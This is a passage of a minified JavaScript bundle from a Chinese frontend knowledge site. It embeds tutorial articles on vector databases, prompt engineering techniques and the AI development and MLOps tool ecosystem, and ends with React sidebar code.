- 使用过滤条件缩小搜索范围
- 实现查询缓存机制

#### 3. 成本控制
- 选择合适的实例规格
- 实现自动扩缩容
- 监控使用量和成本

### 🌟 未来发展趋势

#### 1. 多模态向量数据库
- 支持文本、图像、音频等多种模态
- 跨模态相似性搜索
- 统一向量空间

#### 2. 实时向量处理
- 流式向量摄入
- 实时索引更新
- 增量学习能力

#### 3. 边缘部署
- 轻量级向量数据库
- 本地化部署
- 低延迟访问

向量数据库作为AI应用的基础设施，其重要性将持续增长。随着技术的不断发展，向量数据库将在性能、功能和易用性方面不断提升，为AI应用提供更强大的支持。`,createdAt:"2026-03-15",updatedAt:"2026-03-15"},{id:"prompt-engineering",title:"提示工程（Prompt Engineering）最佳实践",category:"ai",difficulty:"medium",tags:["提示工程","Prompt Engineering","LLM调优","指令设计","上下文学习"],content:`## 提示工程（Prompt Engineering）最佳实践

提示工程是与大语言模型交互的核心技能，通过精心设计的提示（Prompt）来引导模型产生期望的输出。良好的提示工程能够显著提升模型的表现，实现更准确、更可控的AI应用。

### 🎯 提示工程的基本概念

提示工程是指设计、优化和管理输入给AI模型的提示文本的技术和艺术。它涉及理解模型的工作机制，以及如何通过结构化的输入来获得最佳输出。

#### 1. 提示的组成部分
一个有效的提示通常包含以下元素：

**指令（Instruction）**：
- 明确告诉模型要做什么
- 具体、清晰的指导
- 避免模糊表述

**上下文（Context）**：
- 提供必要的背景信息
- 相关的先验知识
- 约束条件和规则

**输入（Input）**：
- 需要处理的具体数据
- 问题或任务的描述
- 待分析的内容

**输出指示符（Output Indicator）**：
- 指定期望的输出格式
- 结构化要求
- 长度限制

\`\`\`python
# 示例：结构化提示模板
def create_structured_prompt(task, context, input_data, output_format):
    prompt = f"""
    任务：{task}
    
    背景信息：{context}
    
    输入数据：{input_data}
    
    请按照以下格式输出：{output_format}
    
    回答：
    """
    return prompt
\`\`\`

### 🧠 提示设计原则

#### 1. 明确性原则
提示应该清晰明确，避免歧义：

**不良示例**：
"告诉我一些关于AI的事情"

**改进示例**：
"请用不超过200字概括人工智能的主要发展历程，包括关键里程碑和技术突破。"

#### 2. 具体性原则
提供具体的指导和约束：

**不良示例**：
"写一篇好文章"

**改进示例**：
"写一篇800字左右的科技文章，主题是'机器学习在医疗诊断中的应用'，要求包含引言、三个主要应用场景、技术挑战和未来展望四个部分。"

#### 3. 结构化原则
使用清晰的结构组织提示：

\`\`\`python
def structured_prompt_template():
    template = """
    # 任务说明
    请分析以下文本的情感倾向。
    
    # 输入文本
    {text}
    
    # 分析要求
    1. 识别主要情感类别（积极、消极、中性）
    2. 提供置信度评分（0-100%）
    3. 指出关键情感词汇
    4. 给出简要理由
    
    # 输出格式
    - 情感类别: [类别]
    - 置信度: [百分比]
    - 关键词: [词汇列表]
    - 理由: [简要说明]
    """
    return template
\`\`\`

### 🔧 高级提示技术

#### 1. 少样本学习（Few-Shot Learning）
通过提供少量示例来指导模型：

\`\`\`python
def few_shot_prompt():
    prompt = """
    以下是文本分类的示例：
    
    示例1：
    输入：今天天气真好，心情很愉快
    输出：积极情感
    
    示例2：
    输入：产品质量太差了，非常失望
    输出：消极情感
    
    示例3：
    输入：明天开会讨论项目进展
    输出：中性情感
    
    现在请对以下文本进行分类：
    输入：{new_text}
    输出：
    """
    return prompt
\`\`\`

#### 2. 链式思考（Chain-of-Thought）
引导模型逐步推理：

\`\`\`python
def chain_of_thought_prompt(problem):
    prompt = f"""
    请逐步解决以下问题：
    
    问题：{problem}
    
    解决步骤：
    1. 首先，分析问题的关键要素
    2. 然后，确定解决问题的方法
    3. 接着，逐步执行计算或推理
    4. 最后，得出结论并验证
    
    请详细展示每一步的思考过程：
    """
    return prompt
\`\`\`

#### 3. 自我一致性（Self-Consistency）
通过多次采样提高准确性：

\`\`\`python
def self_consistency_approach(prompt, model, num_samples=5):
    """通过多次采样获得一致答案"""
    responses = []
    for _ in range(num_samples):
        response = model.generate(prompt, temperature=0.7)
        responses.append(response)
    
    # 选择最常见的答案
    from collections import Counter
    answer_counts = Counter(responses)
    best_answer = answer_counts.most_common(1)[0][0]
    
    return best_answer, responses
\`\`\`

### 🚀 专业提示技巧

#### 1. 角色扮演
让模型承担特定角色：

\`\`\`python
def role_playing_prompt(role, task):
    prompt = f"""
    你是{role}，请完成以下任务：
    
    {task}
    
    请以{role}的专业知识和视角来回答，使用相应的术语和表达方式。
    """
    return prompt

# 示例
prompt = role_playing_prompt(
    "资深软件架构师", 
    "分析微服务架构的优缺点"
)
\`\`\`

#### 2. 思维树（Tree of Thoughts）
将复杂问题分解为多个思维路径：

\`\`\`python
def tree_of_thoughts_prompt(problem):
    prompt = f"""
    问题：{problem}
    
    请按以下方式思考：
    
    1. 问题分解
       - 将问题分解为3-5个子问题
       - 为每个子问题提供初步思路
    
    2. 多角度分析
       - 从不同角度审视问题
       - 考虑各种可能性
    
    3. 方案生成
       - 基于分析生成解决方案
       - 评估各方案的可行性
    
    4. 最终决策
       - 选择最佳方案
       - 提供实施建议
    """
    return prompt
\`\`\`

#### 3. 反思与自我修正
引导模型反思和改进：

\`\`\`python
def reflection_prompt(initial_answer, question):
    prompt = f"""
    问题：{question}
    初始答案：{initial_answer}
    
    请反思你的初始答案：
    1. 检查逻辑是否正确
    2. 验证事实是否准确
    3. 考虑是否有更好的表达方式
    4. 识别可能的错误或遗漏
    
    基于反思，提供改进后的答案：
    """
    return prompt
\`\`\`

### 📊 不同场景的提示策略

#### 1. 内容生成
**新闻写作**：
\`\`\`python
news_prompt = """
角色：专业记者

任务：根据提供的信息撰写新闻稿

要求：
- 标题简洁有力，突出重点
- 正文结构：导语-主体-结尾
- 语言客观、准确、简洁
- 包含时间、地点、人物、事件要素
- 字数控制在300-500字

信息：{information}
"""
\`\`\`

**创意写作**：
\`\`\`python
creative_prompt = """
风格：{style}
主题：{theme}
长度：{length}
受众：{audience}

请创作一个符合以下要求的故事：
- 情节完整，有开头、发展、高潮、结尾
- 人物形象鲜明
- 语言风格符合指定风格
- 主题明确且有意义
"""
\`\`\`

#### 2. 代码生成
\`\`\`python
code_generation_prompt = """
语言：{programming_language}
功能：{function_description}
约束：{constraints}

请生成满足以下要求的代码：
1. 代码结构清晰，逻辑正确
2. 包含必要的注释
3. 遵循最佳实践
4. 考虑边界情况
5. 包含错误处理

代码：
"""
\`\`\`

#### 3. 数据分析
\`\`\`python
analysis_prompt = """
数据类型：{data_type}
数据内容：{data_content}
分析目标：{analysis_goal}

请进行以下分析：
1. 数据概览（基本统计信息）
2. 趋势分析
3. 异常检测
4. 相关性分析
5. 结论和建议

请以结构化格式呈现结果。
"""
\`\`\`

### 🔧 提示优化技术

#### 1. A/B测试
对不同提示版本进行效果对比：

\`\`\`python
def ab_test_prompts(prompts, test_data, evaluation_metric):
    """A/B测试不同提示的效果"""
    results = {}
    
    for prompt_name, prompt in prompts.items():
        scores = []
        for sample in test_data:
            response = model.generate(prompt.format(**sample))
            score = evaluate_response(response, sample['expected'], evaluation_metric)
            scores.append(score)
        
        results[prompt_name] = {
            'average_score': sum(scores) / len(scores),
            'responses': [model.generate(prompt.format(**sample)) for sample in test_data]
        }
    
    return results
\`\`\`

#### 2. 提示链（Prompt Chaining）
将复杂任务分解为多个步骤：

\`\`\`python
def chained_prompts():
    steps = [
        {
            'name': '信息提取',
            'prompt': "从以下文本中提取关键信息：{text}"
        },
        {
            'name': '分析',
            'prompt': "分析以下信息：{extracted_info}"
        },
        {
            'name': '总结',
            'prompt': "基于以下分析给出总结：{analysis}"
        }
    ]
    return steps
\`\`\`

#### 3. 动态提示
根据输入动态调整提示内容：

\`\`\`python
def dynamic_prompt(input_text):
    # 分析输入特征
    length = len(input_text)
    complexity = analyze_complexity(input_text)
    
    if length < 100:
        return f"请详细解释以下短文本：{input_text}"
    elif complexity > 0.7:
        return f"请用简单语言解释以下复杂内容：{input_text}"
    else:
        return f"请分析以下内容：{input_text}"
\`\`\`

### 🛡️ 安全和伦理考虑

#### 1. 防止有害输出
\`\`\`python
def safe_prompt(user_input):
    prompt = f"""
    重要：请确保你的回答安全、有益、符合道德规范。
    
    用户问题：{user_input}
    
    请提供有用且安全的回答，避免：
    - 有害建议
    - 偏见内容
    - 虚假信息
    - 违法内容
    """
    return prompt
\`\`\`

#### 2. 偏见缓解
\`\`\`python
def bias_aware_prompt():
    prompt = """
    请注意避免任何形式的偏见，包括但不限于：
    - 性别偏见
    - 种族偏见
    - 地域偏见
    - 年龄偏见
    - 职业偏见
    
    请提供客观、公正的回答。
    """
    return prompt
\`\`\`

### 📈 评估和改进

#### 1. 提示质量评估指标
- **相关性**：输出与输入的相关程度
- **准确性**：信息的正确性
- **完整性**：覆盖要点的全面性
- **一致性**：多次运行结果的稳定性
- **创造性**：新颖性和独创性

#### 2. 持续改进流程
\`\`\`python
def prompt_improvement_cycle(initial_prompt, test_cases, improvement_iterations=5):
    current_prompt = initial_prompt
    
    for iteration in range(improvement_iterations):
        # 测试当前提示
        test_results = test_prompt(current_prompt, test_cases)
        
        # 分析失败案例
        failure_analysis = analyze_failures(test_results)
        
        # 生成改进建议
        improvements = generate_improvements(failure_analysis)
        
        # 更新提示
        current_prompt = update_prompt(current_prompt, improvements)
        
        print(f"迭代 {iteration + 1}: 提示已更新")
    
    return current_prompt
\`\`\`

### 🚀 实战案例

#### 1. 客服对话系统
\`\`\`python
customer_service_prompt = """
你是{company_name}的客服代表，请处理以下客户咨询：

客户信息：
- 姓名：{customer_name}
- 会员等级：{membership_level}
- 历史记录：{history}

客户问题：{customer_query}

请遵循以下原则：
1. 保持友好、专业的态度
2. 优先考虑高价值客户
3. 提供具体解决方案
4. 如需升级，说明升级原因
5. 询问是否还有其他帮助

回复：
"""
\`\`\`

#### 2. 技术文档生成
\`\`\`python
tech_doc_prompt = """
API名称：{api_name}
功能描述：{function_desc}
参数：{parameters}
返回值：{return_values}

请生成技术文档，包含：
1. 功能概述
2. 参数说明（类型、必填、描述）
3. 返回值说明
4. 使用示例（至少2个）
5. 错误码说明
6. 注意事项

文档应简洁明了，便于开发者使用。
"""
\`\`\`

### 🌟 最佳实践总结

#### 1. 设计原则
- 从简单开始，逐步复杂化
- 保持提示的一致性
- 使用明确的分隔符
- 提供足够的上下文

#### 2. 测试策略
- 多样化测试用例
- 边界情况测试
- 压力测试
- 用户验收测试

#### 3. 维护建议
- 版本控制提示
- 监控性能指标
- 定期更新优化
- 文档化变更

提示工程是一门既科学又艺术的技术，需要在实践中不断探索和完善。通过掌握这些原则和技巧，可以显著提升与AI模型交互的效果，构建更智能、更可靠的应用系统。`,createdAt:"2026-03-15",updatedAt:"2026-03-15"},{id:"ai-tools",title:"AI开发工具与平台生态系统",category:"ai",difficulty:"medium",tags:["AI工具","开发平台","模型训练","部署工具","MLOps"],content:`## AI开发工具与平台生态系统

AI开发工具和平台构成了现代人工智能应用开发的基础设施。从数据处理到模型训练，从部署到监控，完整的工具链为AI工程师提供了端到端的解决方案。

### 🛠️ AI开发工具分类

#### 1. 数据处理工具
数据是AI开发的基础，高质量的数据处理工具至关重要：

**数据标注工具**：
- **Label Studio**：通用数据标注平台
- **Prodigy**：主动学习标注工具
- **SuperAnnotate**：计算机视觉标注平台

**数据预处理**：
- **Pandas**：Python数据分析库
- **Polars**：高性能数据处理
- **Apache Spark**：大数据处理框架

\`\`\`python
import pandas as pd
from sklearn.preprocessing import StandardScaler

# 数据加载和预处理
def preprocess_data(file_path):
    # 读取数据
    df = pd.read_csv(file_path)
    
    # 数据清洗
    df = df.dropna()  # 删除缺失值
    df = df.drop_duplicates()  # 删除重复值
    
    # 特征工程
    scaler = StandardScaler()
    numerical_cols = df.select_dtypes(include=['number']).columns
    df[numerical_cols] = scaler.fit_transform(df[numerical_cols])
    
    return df

# 使用示例
processed_data = preprocess_data('dataset.csv')
\`\`\`

#### 2. 模型开发框架
**深度学习框架**：
- **PyTorch**：动态计算图，研究友好
- **TensorFlow**：静态计算图，生产就绪
- **JAX**：函数式编程，高性能计算

**高级框架**：
- **Hugging Face Transformers**：预训练模型库
- **FastAI**：简化深度学习开发
- **Keras**：高层神经网络API

\`\`\`python
import torch
import torch.nn as nn
from transformers import AutoTokenizer, AutoModel

class TextClassifier(nn.Module):
    def __init__(self, model_name, num_classes):
        super().__init__()
        self.tokenizer = AutoTokenizer.from_pretrained(model_name)
        self.model = AutoModel.from_pretrained(model_name)
        self.classifier = nn.Linear(self.model.config.hidden_size, num_classes)
        
    def forward(self, input_ids, attention_mask):
        outputs = self.model(input_ids=input_ids, attention_mask=attention_mask)
        pooled_output = outputs.last_hidden_state[:, 0]  # CLS token
        logits = self.classifier(pooled_output)
        return logits

# 模型实例化
model = TextClassifier('bert-base-uncased', num_classes=2)
\`\`\`

#### 3. 实验管理工具
**实验跟踪**：
- **MLflow**：实验跟踪和模型管理
- **Weights & Biases**：可视化和实验管理
- **Comet**：MLOps平台

\`\`\`python
import mlflow
import mlflow.pytorch

# MLflow实验跟踪
def train_with_tracking(model, train_loader, val_loader, epochs):
    with mlflow.start_run():
        # 记录参数
        mlflow.log_param("epochs", epochs)
        mlflow.log_param("learning_rate", 0.001)
        
        for epoch in range(epochs):
            # 训练循环
            train_loss = train_epoch(model, train_loader)
            val_acc = validate(model, val_loader)
            
            # 记录指标
            mlflow.log_metric("train_loss", train_loss, step=epoch)
            mlflow.log_metric("val_accuracy", val_acc, step=epoch)
        
        # 记录模型
        mlflow.pytorch.log_model(model, "model")
\`\`\`

### 🚀 模型训练工具

#### 1. 分布式训练
**Horovod**：跨多GPU/多节点训练
\`\`\`python
import horovod.torch as hvd

# 初始化Horovod
hvd.init()

# 设置GPU
torch.cuda.set_device(hvd.local_rank())

# 模型和优化器
model = MyModel()
optimizer = torch.optim.Adam(model.parameters())

# 分布式优化器
optimizer = hvd.DistributedOptimizer(optimizer)

# 广播参数
hvd.broadcast_parameters(model.state_dict(), root_rank=0)
\`\`\`

**DeepSpeed**：微软的优化库
\`\`\`python
import deepspeed

# DeepSpeed配置
ds_config = {
    "train_batch_size": 32,
    "gradient_clipping": 1.0,
    "fp16": {
        "enabled": True
    },
    "zero_optimization": {
        "stage": 2
    }
}

# 初始化DeepSpeed
model, optimizer, _, _ = deepspeed.initialize(
    model=model,
    optimizer=optimizer,
    config=ds_config
)
\`\`\`

#### 2. 超参数优化
**Optuna**：自动化超参数优化
\`\`\`python
import optuna

def objective(trial):
    # 定义搜索空间
    lr = trial.suggest_float('lr', 1e-5, 1e-1, log=True)
    batch_size = trial.suggest_categorical('batch_size', [16, 32, 64])
    hidden_size = trial.suggest_int('hidden_size', 64, 512)
    
    # 训练模型
    model = SimpleModel(hidden_size)
    optimizer = torch.optim.Adam(model.parameters(), lr=lr)
    
    # 评估模型
    accuracy = train_and_evaluate(model, optimizer, batch_size)
    return accuracy

# 优化
study = optuna.create_study(direction='maximize')
study.optimize(objective, n_trials=100)
\`\`\`

### 📦 模型部署工具

#### 1. 模型服务化
**TorchServe**：PyTorch模型服务
\`\`\`bash
# 创建模型档案
torch-model-archiver --model-name my_model \\
    --version 1.0 \\
    --model-file model.py \\
    --serialized-file model.pth \\
    --handler handler.py

# 启动服务
torchserve --start --model-store model_store --models my_model=my_model.mar
\`\`\`

**TensorFlow Serving**：TensorFlow模型服务
\`\`\`python
# TensorFlow Serving配置
model_config_file = """
model_config_list: {
  config: {
    name: "my_model",
    base_path: "/path/to/models",
    model_platform: "tensorflow"
  }
}
"""

# 启动服务
# tensorflow_model_server --model_config_file=/path/to/config
\`\`\`

#### 2. 容器化部署
**Docker**：容器化部署
\`\`\`dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install -r requirements.txt

COPY . .

EXPOSE 8000

CMD ["python", "app.py"]
\`\`\`

**Kubernetes**：容器编排
\`\`\`yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ai-model-deployment
spec:
  replicas: 3
  selector:
    matchLabels:
      app: ai-model
  template:
    metadata:
      labels:
        app: ai-model
    spec:
      containers:
      - name: model-container
        image: ai-model:latest
        ports:
        - containerPort: 8000
        resources:
          requests:
            memory: "1Gi"
            cpu: "500m"
          limits:
            memory: "2Gi"
            cpu: "1000m"
\`\`\`

### 🧪 MLOps工具栈

#### 1. 数据版本控制
**DVC（Data Version Control）**：
\`\`\`bash
# 初始化DVC
dvc init

# 添加数据文件
dvc add data/training_dataset.csv

# 推送数据到远程存储
dvc push

# 拉取数据
dvc pull
\`\`\`

**Kedro**：数据科学流水线
\`\`\`python
from kedro.pipeline import Pipeline, node
from kedro.runner import SequentialRunner

def load_data(filepath):
    return pd.read_csv(filepath)

def process_data(data):
    # 数据处理逻辑
    return processed_data

def train_model(data):
    # 模型训练逻辑
    return model

# 构建流水线
pipeline = Pipeline([
    node(load_data, "raw_data", "processed_data", name="load_raw_data"),
    node(process_data, "processed_data", "clean_data", name="process_data"),
    node(train_model, "clean_data", "model", name="train_model")
])

# 运行流水线
runner = SequentialRunner()
runner.run(pipeline)
\`\`\`

#### 2. CI/CD for ML
**GitHub Actions for ML**：
\`\`\`yaml
name: ML Pipeline
on: [push, pull_request]

jobs:
  train:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    - name: Setup Python
      uses: actions/setup-python@v2
      with:
        python-version: 3.9
    - name: Install dependencies
      run: |
        pip install -r requirements.txt
    - name: Run training
      run: |
        python train.py
    - name: Run tests
      run: |
        pytest tests/
    - name: Upload model
      uses: actions/upload-artifact@v2
      with:
        name: trained-model
        path: models/
\`\`\`

### 🌐 云平台AI服务

#### 1. AWS AI Services
**SageMaker**：端到端机器学习平台
- Notebook实例
- 训练作业
- 模型部署
- AutoML功能

\`\`\`python
import sagemaker
from sagemaker.huggingface import HuggingFace

# SageMaker训练
huggingface_estimator = HuggingFace(
    entry_point='train.py',
    source_dir='src',
    role=sagemaker.get_execution_role(),
    transformers_version='4.12',
    pytorch_version='1.9',
    py_version='py38',
    instance_type='ml.p3.2xlarge',
    instance_count=1,
    hyperparameters={
        'epochs': 3,
        'train_batch_size': 16,
        'model_name': 'bert-base-uncased'
    }
)

# 启动训练
huggingface_estimator.fit({'train': 's3://my-bucket/train/'})
\`\`\`

#### 2. Google Cloud AI Platform
**Vertex AI**：Google的AI平台
- AutoML
- Custom training
- Model deployment
- Feature store

#### 3. Azure Machine Learning
**Azure ML**：微软的AI平台
- ML Studio
- Automated ML
- Model management
- MLOps capabilities

### 🤖 特定领域工具

#### 1. 计算机视觉
**OpenCV**：计算机视觉库
\`\`\`python
import cv2
import numpy as np

# 图像预处理
def preprocess_image(image_path):
    img = cv2.imread(image_path)
    img = cv2.resize(img, (224, 224))
    img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
    img = img.astype(np.float32) / 255.0
    return img

# 目标检测
def detect_objects(model, image):
    predictions = model.predict(image)
    return predictions
\`\`\`

**Detectron2**：Facebook的目标检测框架
\`\`\`python
from detectron2.engine import DefaultPredictor
from detectron2.config import get_cfg
from detectron2 import model_zoo

cfg = get_cfg()
cfg.MODEL.WEIGHTS = model_zoo.get_checkpoint_url("COCO-Detection/faster_rcnn_R_50_FPN_3x.yaml")
predictor = DefaultPredictor(cfg)

# 预测
outputs = predictor(image)
\`\`\`

#### 2. 自然语言处理
**spaCy**：工业级NLP库
\`\`\`python
import spacy

# 加载模型
nlp = spacy.load("en_core_web_sm")

# 文本处理
def process_text(text):
    doc = nlp(text)
    
    # 命名实体识别
    entities = [(ent.text, ent.label_) for ent in doc.ents]
    
    # 词性标注
    pos_tags = [(token.text, token.pos_) for token in doc]
    
    # 依存句法分析
    dependencies = [(token.text, token.dep_, token.head.text) for token in doc]
    
    return {
        'entities': entities,
        'pos_tags': pos_tags,
        'dependencies': dependencies
    }
\`\`\`

#### 3. 时间序列分析
**Prophet**：Facebook的时间序列预测
\`\`\`python
from fbprophet import Prophet

# 创建模型
model = Prophet(
    growth='linear',
    seasonality_mode='multiplicative',
    yearly_seasonality=True,
    weekly_seasonality=True
)

# 训练模型
model.fit(df)  # df需要有'ds'和'y'列

# 预测
future = model.make_future_dataframe(periods=365)
forecast = model.predict(future)
\`\`\`

### 🔧 模型优化工具

#### 1. 模型压缩
**TensorRT**：NVIDIA的推理优化
\`\`\`python
import tensorrt as trt
import numpy as np

def optimize_with_tensorrt(engine_path):
    # 创建TensorRT运行时
    runtime = trt.Runtime(trt.Logger(trt.Logger.WARNING))
    
    # 加载优化后的引擎
    with open(engine_path, 'rb') as f:
        engine = runtime.deserialize_cuda_engine(f.read())
    
    return engine
\`\`\`

**ONNX**：开放神经网络交换格式
\`\`\`python
import onnx
import onnxruntime as ort

# 转换模型到ONNX
torch.onnx.export(
    model,
    dummy_input,
    "model.onnx",
    export_params=True,
    opset_version=11
)

# 使用ONNX Runtime推理
session = ort.InferenceSession("model.onnx")
output = session.run(None, {'input': input_data})
\`\`\`

#### 2. 量化工具
**PyTorch Quantization**：
\`\`\`python
import torch.quantization as quant

# 准备量化
model.qconfig = torch.quantization.get_default_qconfig('fbgemm')
model_prepared = torch.quantization.prepare(model, inplace=False)

# 校准
with torch.no_grad():
    for data, target in calibration_loader:
        model_prepared(data)

# 转换为量化模型
model_quantized = torch.quantization.convert(model_prepared, inplace=False)
\`\`\`

### 📊 监控和可观测性

#### 1. 模型监控
**Prometheus + Grafana**：
\`\`\`python
from prometheus_client import Counter, Histogram, start_http_server

# 定义指标
request_counter = Counter('model_requests_total', 'Total model requests')
prediction_histogram = Histogram('prediction_time_seconds', 'Prediction time')

def predict_with_monitoring(model, input_data):
    request_counter.inc()
    
    with prediction_histogram.time():
        result = model.predict(input_data)
    
    return result

# 启动监控服务器
start_http_server(8000)
\`\`\`

#### 2. 数据漂移检测
**Alibi Detect**：
\`\`\`python
from alibi_detect.cd import MMDDrift

# 训练时数据分布
reference_data = X_train

# 创建漂移检测器
cd = MMDDrift(
    x_ref=reference_data,
    p_val=0.05,
    backend='pytorch'
)

# 检测漂移
preds = cd.predict(X_current)
if preds['data']['is_drift']:
    print("检测到数据漂移！")
\`\`\`

### 🚀 最佳实践

#### 1. 工具选择指南
- **项目规模**：小项目用简单工具，大项目用完整栈
- **团队技能**：选择团队熟悉的工具
- **预算考虑**：开源vs商业解决方案
- **合规要求**：数据安全和隐私

#### 2. 工作流程
1. **数据准备**：清洗、标注、验证
2. **模型开发**：实验、训练、验证
3. **模型优化**：压缩、量化、加速
4. **部署上线**：服务化、监控、维护
5. **持续改进**：反馈收集、模型更新

#### 3. 安全考虑
- **模型安全**：对抗攻击防护
- **数据安全**：隐私保护、访问控制
- **部署安全**：API安全、身份验证

### 🌟 未来发展趋势

#### 1. 低代码/无代码平台
- **AutoML**：自动化机器学习
- **可视化建模**：拖拽式建模
- **预构建解决方案**：行业特定模板

#### 2. 边缘AI工具
- **边缘推理**：本地模型部署
- **联邦学习**：分布式训练
- **模型压缩**：移动端优化

#### 3. 协作工具
- **团队协作**：多人同时开发
- **知识管理**：经验分享平台
- **自动化测试**：CI/CD集成

AI开发工具生态系统正在快速发展，新的工具和技术不断涌现。选择合适的工具组合，建立高效的开发流程，是成功构建AI应用的关键。随着技术的进步，AI开发将变得更加便捷和高效。`,createdAt:"2026-03-15",updatedAt:"2026-03-15"}];e.s(["categories",0,eg,"knowledgeList",0,eh],52947);let ev=e=>{switch(e){case"easy":return"🟢";case"medium":return"🟡";case"hard":return"🔴";default:return"⚪"}};e.s(["getDifficultyColor",0,e=>{switch(e){case"easy":return"green";case"medium":return"orange";case"hard":return"red";default:return"default"}},"getDifficultyEmoji",0,ev,"getDifficultyText",0,e=>{switch(e){case"easy":return"简单";case"medium":return"中等";case"hard":return"困难";default:return"未知"}}],5330);let{Sider:eb}=i.Layout,{Title:ey,Text:eS}=s.Typography,ex={all:(0,t.jsx)(q,{}),css:(0,t.jsx)(Y,{}),javascript:(0,t.jsx)(X,{}),vue:(0,t.jsx)(ea.BookOutlined,{}),react:(0,t.jsx)(ef,{}),security:(0,t.jsx)(et,{}),performance:(0,t.jsx)(en,{}),engineering:(0,t.jsx)(ed,{}),browser:(0,t.jsx)(el,{}),ai:(0,t.jsx)(ef,{})};function eC(){let e=(0,n.usePathname)(),i=e.split("/")[1]||"all",s=e.split("/")[2],[l,c]=(0,r.useState)("all"!==i?[i]:[]),u=[{key:"all",icon:ex.all,label:(0,t.jsxs)(o.default,{href:"/",className:"flex items-center justify-between",children:[(0,t.jsx)("span",{children:"全部知识点"}),(0,t.jsx)("span",{className:"text-xs opacity-70 bg-white/10 px-2 py-1 rounded-full",children:eh.length})]}),selected:"all"===i}];return eg.forEach(e=>{let r=eh.filter(t=>t.category===e.id).map(r=>({key:`${e.id}-${r.id}`,label:(0,t.jsxs)(o.default,{href:`/${e.id}/${r.id}`,className:"flex items-center gap-2",children:[(0,t.jsx)("span",{className:"flex-1",children:r.title}),(0,t.jsx)("span",{className:"text-xs opacity-50",children:ev(r.difficulty)})]}),selected:i===e.id&&s===r.id}));u.push({key:e.id,icon:ex[e.id]||(0,t.jsx)(ea.BookOutlined,{}),label:(0,t.jsxs)("div",{className:"flex items-center justify-between",children:[(0,t.jsx)("span",{children:e.name}),(0,t.jsx)("span",{className:"text-xs opacity-70 bg-white/10 px-2 py-1 rounded-full",children:eh.filter(t=>t.category===e.id).length})]}),selected:i===e.id&&!s,children:r.length>0?r:void 0})}),(0,t.jsxs)(eb,{width:300,theme:"light",className:"sidebar-sider",style:{position:"fixed",left:0,top:0,height:"100vh",background:"var(--sidebar-bg)",boxShadow:"2px 0 8px rgba(0, 0, 0, 0.1)",zIndex:1e3},children:[(0,t.jsx)("div",{className:"p-6 sidebar-header",children:(0,t.jsx)(o.default,{href:"/",className:"block",children:(0,t.jsxs)("div",{className:"flex items-center gap-3 mb-2",children:[(0,t.jsx)(k,{size:48,style:{background:"linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%)",border:"3px solid rgba(99, 102, 241, 0.1)"},icon:(0,t.jsx)(ea.BookOutlined,{})}),(0,t.jsxs)("div",{children:[(0,t.jsx)(ey,{level:4,style:{color:"var(--color-foreground)",margin:0,fontSize:"18px"},children:"前端知识宝典"}),(0,t.jsx)(eS,{style:{color:"var(--color-text-secondary)",fontSize:"12px"},children:"Senior Frontend Knowledge"})]})]})})}),(0,t.jsx)(a.default,{mode:"inline",openKeys:l,onOpenChange:e=>{c(e)},selectedKeys:s?[`${i}-${s}`]:[i],style:{height:"calc(100vh - 140px)",overflowY:"auto",borderRight:0,background:"transparent",paddingTop:"16px"},items:u,className:"sidebar-menu"})]})}e.s(["default",()=>eC],22140)}]);